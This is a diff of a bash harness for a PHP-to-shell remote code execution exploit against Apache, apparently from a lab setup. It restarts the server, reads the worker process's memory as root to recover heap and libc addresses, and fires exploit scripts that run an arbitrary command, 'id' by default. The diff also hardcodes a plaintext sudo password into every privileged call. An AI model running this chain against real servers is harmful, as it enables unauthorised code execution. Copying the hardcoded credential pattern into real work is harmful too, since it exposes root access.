@@ -5,12 +5,12 @@
 # ASLR-independent.
 cd /home/debian/php2shell-work
 CMD="${CMD:-id>/tmp/p1}"
-sudo -n bash -c "apache2ctl -k stop 2>/dev/null; sleep 0.6; pkill -9 apache2; sleep 0.6; pkill -9 gdb; sleep 0.3; ulimit -c unlimited; /usr/sbin/apache2ctl -k start; sleep 0.8" >/dev/null 2>&1
-sudo -n rm -f /tmp/p1 /tmp/sess_attacksessionid0001 >/dev/null 2>&1
+echo debian.qwe123 | sudo -S bash -c "apache2ctl -k stop 2>/dev/null; sleep 0.6; pkill -9 apache2; sleep 0.6; pkill -9 gdb; sleep 0.3; ulimit -c unlimited; /usr/sbin/apache2ctl -k start; sleep 0.8" >/dev/null 2>&1
+echo debian.qwe123 | sudo -S rm -f /tmp/p1 /tmp/sess_attacksessionid0001 >/dev/null 2>&1
 timeout 40 python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7 >/dev/null 2>&1
 sleep 0.4
 W=$(pgrep -x apache2 | tail -1)
-sudo -n python3 - "$W" <<'PY' > /tmp/aslr_addrs
+echo debian.qwe123 | sudo -S python3 - "$W" <<'PY' > /tmp/aslr_addrs
 import sys
 pid=sys.argv[1]
 chunk=lib=0
@@ -25,7 +25,7 @@ print("chunk=0x%x libbase=0x%x ht=0x%x sys=0x%x"%(chunk,lib,chunk+0x6e0d8,lib+0x
 print(hex(chunk+0x6e0d8), hex(lib+0x4c490))
 PY
 read HT SYS < /tmp/aslr_addrs
-echo "worker=$W pers=$(sudo -n cat /proc/$W/personality 2>/dev/null) HT=$HT SYS=$SYS"
+echo "worker=$W pers=$(echo debian.qwe123 | sudo -S cat /proc/$W/personality 2>/dev/null) HT=$HT SYS=$SYS"
 timeout 20 python3 send_b_rce2.py 16 2 $HT $SYS "$CMD"
 sleep 1
 echo "--- proof:"
